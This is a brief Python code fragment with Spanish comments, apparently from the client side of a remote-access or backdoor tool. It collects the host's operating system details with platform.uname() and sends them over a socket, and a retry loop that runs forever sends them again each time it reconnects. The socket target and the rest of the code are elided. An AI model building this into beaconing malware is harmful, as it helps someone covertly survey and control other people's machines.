...
def send_system_info(s):
    system_info = platform.uname()  # Obtiene información sobre el sistema operativo
    info_str = f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}\n"

    s.sendall(info_str.encode())  # Envía la información al socket
...
def connect_with_retry():
    while True:
        ...
        try:
            ...
            # Envía información del sistema operativo al establecer la conexión
            send_system_info(s)
